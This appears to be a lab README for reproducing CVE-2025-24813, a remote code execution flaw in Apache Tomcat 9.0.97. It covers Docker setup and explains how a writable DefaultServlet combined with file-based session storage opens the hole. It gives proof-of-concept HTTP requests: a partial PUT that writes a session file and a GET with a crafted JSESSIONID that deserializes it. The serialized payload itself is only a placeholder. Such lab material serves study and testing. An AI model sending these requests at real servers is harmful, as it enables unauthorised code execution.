# Tomcat Remote Code Execute (CVE-2025-24813)

[中文版本(Chinese version)](README.zh-cn.md)

Tomcat version: 9.0.97

## Environment Setup

```
docker compose build
docker compose up -d
```

After successfully running the commands above, you will see the example page of Tomcat through visiting the site `http://your-ip:8080`.

## Rationale

Reference links:

- https://forum.butian.net/article/674

Due to the configuration of Tomcat being writable (readonly=false) and the file storage for sessions, with their default storage path both set to $CATALINA_BASE/work/Catalina/localhost/ROOT, it allows us to write files to the server. Furthermore, by specifying the JSESSIONID, we can trigger deserialization of the files we have written.

```
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

Partial PUT request is used to upload a file, the path separators (/) in the file path are converted to periods (.) and temporarily stored in $CATALINA_BASE/work/Catalina/localhost/ROOT.

## POC

By Content-Range request header to craft an partial PUT request, the following data packet can be sent to cause Tomcat to write a file named .deserialize.session in the temporary directory:

```
PUT /deserialize/session HTTP/1.1
Host: 127.0.0.1:8080
Content-Length: 1000
Content-Range: bytes 0-1000/1200

deserialize content
```

Send the following data packet to trigger deserialization:

```
GET / HTTP/1.1
Host: 127.0.0.1:8080
Cookie: JSESSIONID=.deserialize
```

As follows:

![](01.jpg)
